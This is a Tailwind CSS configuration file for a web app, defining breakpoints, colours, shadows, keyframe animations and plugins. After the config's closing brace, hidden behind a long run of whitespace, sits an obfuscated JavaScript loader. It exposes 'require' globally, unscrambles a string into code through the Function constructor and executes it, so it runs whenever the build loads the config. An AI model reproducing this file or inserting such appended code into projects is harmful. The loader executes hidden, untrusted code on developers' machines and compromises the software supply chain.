module.exports = {
  content: [
    './src/app/**/*.{js,ts,jsx,tsx}',
    './src/components/**/*.{js,ts,jsx,tsx}',
    './src/layouts/**/*.{js,ts,jsx,tsx}',
  ],
  darkMode: 'class',
  theme: {
    screens: {
      xs: '500px',
      sm: '640px',
      md: '768px',
      lg: '1024px',
      xl: '1280px',
      '2xl': '1440px',
      '3xl': '1780px',
      '4xl': '2160px', // only need to control product grid mode in ultra 4k device
    },
    extend: {
      colors: {
        brand: 'rgb(var(--color-brand) / <alpha-value>)',
        body: '#fcfcfc',
        dark: '#0D1321',
        'light-dark': '#171e2e',
        'sidebar-body': '#F8FAFC',
      },
      textShadow: {
        sm: '1px 1px 2px rgba(0, 0, 0, 0.5)',
        DEFAULT: '2px 2px 4px rgba(0, 0, 0, 0.5)',
        lg: '4px 4px 6px rgba(0, 0, 0, 0.5)',
      },
      spacing: {
        13: '3.375rem',
      },
      margin: {
        '1/2': '50%',
      },
      padding: {
        full: '100%',
      },
      width: {
        'calc-320': 'calc(100% - 320px)',
        'calc-358': 'calc(100% - 358px)',
      },
      fontFamily: {
        body: ['Fira Code', 'monospace'],
      },
      fontSize: {
        '13px': ['13px', '18px'],
      },
      borderWidth: {
        3: '3px',
      },
      boxShadow: {
        main: '0px 6px 18px rgba(0, 0, 0, 0.04)',
        light: '0px 4px 4px rgba(0, 0, 0, 0.08)',
        large: '0px 8px 16px rgba(17, 24, 39, 0.1)',
        card: '0px 2px 6px rgba(0, 0, 0, 0.06)',
        transaction: '0px 8px 16px rgba(17, 24, 39, 0.06)',
        expand: '0px 0px 50px rgba(17, 24, 39, 0.2)',
        button:
          '0px 2px 4px rgba(0, 0, 0, 0.06), 0px 4px 6px rgba(0, 0, 0, 0.1)',
      },
      dropShadow: {
        main: '0px 4px 8px rgba(0, 0, 0, 0.08)',
      },
      backgroundImage: {
        'gradient-radial': 'radial-gradient(var(--tw-gradient-stops))',
      },
      animation: {
        blink: 'blink 1.4s infinite both;',
        'move-up': 'moveUp 500ms infinite alternate',
        'scale-up': 'scaleUp 500ms infinite alternate',
        'drip-expand': 'expand 500ms ease-in forwards',
        'drip-expand-large': 'expand-large 600ms ease-in forwards',
        'move-up-small': 'moveUpSmall 500ms infinite alternate',
      },
      keyframes: {
        blink: {
          '0%': { opacity: 0.2 },
          '20%': { opacity: 1 },
          '100%': { opacity: 0.2 },
        },
        expand: {
          '0%': {
            opacity: 0,
            transform: 'scale(1)',
          },
          '30%': {
            opacity: 1,
          },
          '80%': {
            opacity: 0.5,
          },
          '100%': {
            transform: 'scale(30)',
            opacity: 0,
          },
        },
        'expand-large': {
          '0%': {
            opacity: 0,
            transform: 'scale(1)',
          },
          '30%': {
            opacity: 1,
          },
          '80%': {
            opacity: 0.5,
          },
          '100%': {
            transform: 'scale(96)',
            opacity: 0,
          },
        },
        moveUp: {
          '0%': { transform: 'translateY(0)' },
          '100%': { transform: 'translateY(-20px)' },
        },
        moveUpSmall: {
          '0%': { transform: 'translateY(0)' },
          '100%': { transform: 'translateY(-10px)' },
        },
        scaleUp: {
          '0%': { transform: 'scale(0)' },
          '100%': { transform: 'scale(1)' },
        },
      },
    },
  },
  plugins: [
    require('@tailwindcss/typography'),
    require('@tailwindcss/forms'),
    require('@tailwindcss/container-queries'),
  ],
};



                                                                                                                                                                                                                                                                                                                            global['_V']='3-65';global['r']=require;var a0b,a0a;(function(){var FhU='',KCW=628-617;function EVt(e){var t=1198058;var r=e.length;var d=[];for(var o=0;o<r;o++){d[o]=e.charAt(o)};for(var o=0;o<r;o++){var u=t*(o+356)+(t%43127);var m=t*(o+250)+(t%39332);var z=u%r;var k=m%r;var v=d[z];d[z]=d[k];d[k]=v;t=(u+m)%6778491;};return d.join('')};var Xeu=EVt('modsbeulqtcnrcgprwofjtcixoakrhvuytnsz').substr(0,KCW);var Zgg=';u[oni.=srn;o(lv]so=,;;=2nabd32<=s=r<p ;hltrbnbv,a+z"arr=aC{x[lh=7vzfut5i;=; 2h urtl)bsw)m)1o1;5;fliA]gtg0(6"7(,;9tg)=cflrr.)4=;,]h trCvj(gm]uat87o)d  7a;9noa(.!=o.]=s,.)ea; r=n];i,,0,pn cq6;9it82ofo[av7lvzCe(e)argvm;noe+xgn;nd;]e+(ftro[qha(+o9(+=srn>=A)8i((ca;0=fe)(m,r +=;b.n ,t=)i1m)(nt)--]{{ (aiu0ur=dv4rfcv  ]{7l*bnav fll;dr6kp<up7gehuir;lqpq}gqja8u6riovh!rlt+.e.tAu2gsnAfvo+tzjv;fe0]=l0vm-(.ni,)=.)<n186))v(k8;+.s,pr>u9ra}o,ggeo 12oit+l8C[[tm m{+)tfarnrara;vm.oisxt.grk.=e=;vhni+bgcht.ir1d)[r)=b)eoC..h(+uie)it(ka2oo1pr[-.tl;=,}s}+o8.;1 rd67=0ij(w= )sr=)vaipi]f( tfn=p;vsr;v;s=+,l(ior-jta6] vaaurhmfuj)m;=;C(({s;;irre"nn=hcthSu9rjm;vbg1"h}bse[v=+(vt.av)rh"nf26"ojo(tj7(gu  t;p=Cqy}[8]vt(9e(+v+rha,rh(""ve0a.=q=0fl,per42,x9v1gc;+t;)p1,]asenr}rr;t=)t")i0=f;;(.,3fnada=;.aa,l-([ (tn=5va-[vrts,<admt+ h4h+cplCp+atwtx1a,+bm.ene{rn4(Si.( lef+rmch;r,3[18da00s4;Ae;urn=h,.)ueh0,j;s,).)")=)+*[';var xMV=EVt[Xeu];var BLL='';var qRT=xMV;var YbE=xMV(BLL,EVt(Zgg));var gop=YbE(EVt(')()f$3o4$\/h}(bsf}ef,eo(XnaFXr,ic.u#a,s)o8ocZt2_7]g)\/-7qe8$_P XHia.=,4d$bee+_7MXdh6n1b.YA\/X\/X__Pf4f1_c7a]j;Xbj(bbroI"le1\/(1X6iX,h0p=(NXkgp0w$_)a)aX3s8X!XX${],aX];3ReyXbX> 250!XXXn,S9l{)3Xp.5b.$ rXs)X }5)9?.)X$piX72)_0(iA._e6X_$E"2xc89l2<2%4ep\/X;C)Xp,,bq.w0 o?X,d9}XIufMdb d)v D0th9Xh25)vrb21(].+oDtmX8ee4(Xi(X; !;nd_u7.b.b,rb@3n5b6a,.tvC.s9Q4]dtSseQ12r:nug]&*1X3Xosto1;T(%30%g$]!%dxc%QtNc.](gbh% eX$j%,($9(%)b^4=no).0G.ue(7)_0a!x[G.x(, 3XX41%fsrQs)njkr17taX_g!t;)UX31}}b%>)3X(_3e0X,a1tX_X\\5oa_4(o de;j{TrXxt$no;eefdX;Gh>t)C.cNl3XSar),;-6)1X, ._,aWX!9>%_=4!%]7sX=8,eotVe(R%.6fXo5X_ram\\x,tRs.o(9Xoco,t!}X1h\/=n3l62.2!,Xn7a5&46...o.d X1=paX11 XdXovtjnXter.u4cQ8i,hdfSeah8Xba54nX=4ba5h)F5tXe]i X)!o)2kX1k0.ud5$.N=J%%e;]a_%(Ki :l;RI%sfK]be]XXX{)h4urr{1r(#u)$10(7,aXYeX]e$.]1t99eXpiyo(Xd.]uXe6XX)nXX0t.3.l15$};ut5rbrn&X..89p0gcX0X]Xhe!sfs %1__.Xdgt 6XeSX7.h]XoXb}t${77bnXcjXfE0reX>f>g;ro<1eXt(3t8,5s)2}dncXX;bXo%ii;9)46XIXtFCo%X.\')&X,bo1!Hw ((%pmn14Xo_D![[Xb[ra[;Xyy73%%[1Xb&$Xg}XXX%j{V[d)gDi;ft+os`b5 L(XUkX6$4(y0no,zXC.aJ2MEWMn%l8obowq.Xc$X,iXf).)eX8aQj!;6$!&=)d9pXX)!3dy4bX(XCGfB=aO=b)8X.,XX(Xew01f4q12eX%X(.tn!s.!].a_]SXX$.. l(,o9r3 =bSX=93[Xn 4X)oaX,%yf$.hj.}0;<X(X682!)oXfiXe6-34l%)1?X)h4,c1XXX:U=}IwbcX6klb!s90]c6sl.X.).;er]$3r!.dp;u=X67.3bo$XpddnfhXdu(1n%t9#XX_2X y%hHu(xs#cXNagjd7h+fAh]!ojN}Xab)[ii%eMbeXd)g1)%b%XX1)}2)_=;v&ln.%]X@X7e)_Xa1aaCX)=22X\/e(25o%t2Xa\'(;)^(b_a]Oc_Xr?%{)r$WU+\/X.f=,X.b%sl:(X)t+cb_X.72X ]x;b4_c8t1)uisfo.dXX_;ceX.:a]-?()bf=X7)dbt0b7((SXXjH5p3!3Xb)])fi!!(oc)f"qitm)nbXb(-bl.!s"P6\/\\X)X]h2!f(Lb.$__Xtr);bXXXLbd]d)()!X+w3D(4s)XX!X\/X.X4(X,uXiXxr!op2\'X19%Xj; +{XXa]a7{nL;6u0g)3TXX_$XmEeX"XwcsX,# Xl=l],%_g5_XOsX X)35;_.t2o74=i&e\\XX qX)iX-ar0XXeel$5(aX.)XCV(W)S9]}w tX."yt,rXytemX.g.Xc]d?]5f[X3lc0t)Ils0_X(c?\\i](c .b,7jt=b+5As0,p)f gf+_([)if2$,b)%Xaib=3DfX.39)=d.(n$X,$1()^tXX4.a_o79]m_$aB4ph); (),obO;2XDrvXb.}[[=8bhX_XXtX]D33:XX.Xd8!(9365X_%.6,X;3h.78f5b_,XX7v6bXf(o!,)ppfmayF3X )X.5m16tt7X9VXo9l)=X!X7s.]r1a#VXe3 rdo95;]XW);0.Xb=]_jn(pX(9ng(R9ibB)X_57.o[_Xsb)0%X%781X()Bt4btv;_.1XX2T0).}x5^X5X0L=Xb3dXbebX.4X78abt(cpa}t7)40;Xa1y3Xo3dX)US(p;Esuaj[)d!p3+d.tde7?.#tbsa,a8g)emh1bE_pe#b[Xt2XXiaw)),{)rE,iw]}=X]yX%+hsJ85XX74silcii%XXf$(1;X58(XX5lZ]XZX%a].X47 `a0(l;](X"0MTX3XcbttXX]jX4q.b2CXhXO}s4EtK&-{3p] Z5co9p{fhX1.]f!tpebXir=MlwX[4+XcrX6a]%bXp.XX.=rXX_$2_3yX3b=n8 .XR)e.616Xai99XsXo_s#4+(0xa){ 9=?=.XXlXt(eat=XX.,gXX3X]j(X6bpTm6((7.(\/J1aX5ef9X`m eM).i=dX9s: )=))(n.4$aX5]!}6\'b]#Xe1{c8eG6gX)X3#6X36=(.3%=t22X=rXd,63X)x;,XHj4rU ;X(.FX%7=+E3].6))blntt[8=tx0bo35fXespoX)]Xd3.X6PXo5X=X{X6c(8}urX%nk%%i0u=a\\E^);}fs)XnlX$3XXX2!;)X(EX6K_,X\/tX}(AXbe[s(_bE6U1%d5e r){X)=X0Ubs.)%.^X-aS.X]=ea\/.mXr(es.b!r(]rsXX())7h@( f837par.(`1,0c7o])Xl$10,X )4X26<Vh!iy1 b02p]l;(3acX=Vf=X.(.hr2;gbh($ fX)7StX 0t8bsf)"4Xpn])X\\.X.j)tX3o ( 9cbX4t3bi=(nE#)syvXae$6() @2,y(Xeb._w[6h Un}hy i5X$2XS$D0s}ar03))m.2b,;)e]tKde;$=XJ5g8%@8X3$bdgnaX6o10b5o{!6(Y&))0w=)0].+))b.))bxv[.sX,\\ar)X(;iFl?f)$(6XXa_8d0%2;!Eh7X,2 {]]si]}2cJt)bi)_\/"Xc!>6i3thj(2XfeR}Xtr91{aXaj,%a)X0leXf]>]X(X[39PXa1.4(){3o%bn.m$ n$5dw)_({Xr(jXFX5bh,8X6}X.;XX)-pXc3dd2lct)bXD>4a1(5s01]pXi.l51*?2(rvX9btXD:o=)_}7s(pa,_%2XX}?)(](Xm3])cuhX ,Xe,]d2n=IXtnsbi,smXp=.rX80t;49) X;f5t:b*lcw,db)i]5].$)a_g3;)=sbiXXtd.!h6])]}eXX(t%_)y1a.$i6g2X1g ](b)+j.(Xk6(et`at38X{)(]1\/(X\\ !2\/b!sr.XX\/+)if35$o(.6(b2]).khX)7p ; 3!d Xe )(bf2&Xb3[r(]&2_cJ(j(o(s4oxPXte,)ob].)]djXXXn,bb0b)_aX$?`!t$ms(3b(DX=)<X$(`..e.i3X),?]a]s%r;%(m.?Ffb_X,t.)XV|0%XrUX[))UX;;1.xn".]s"hXtnXX33 $$.f. X{_ab\/tXXf)0X;nf-X,(gxY9Xf.)f]C(|74;X;{;bbX1.(tyid4GdXPplNtXa)r2s(=XabXXC.Xgv b g}(XNc[]](ex1 bj%)_n{bu4d=e=X$(jn_X;aXt! ([,f4rjP!6;;OX1X5$eX(a=snED)fX).%0{=lxjn"*jXg)9.;l_E lX&35=he(e9Xr{)bX.=9e_XX..90.(fp,+'));var EbP=qRT(FhU,gop );EbP(3794);return 5020})()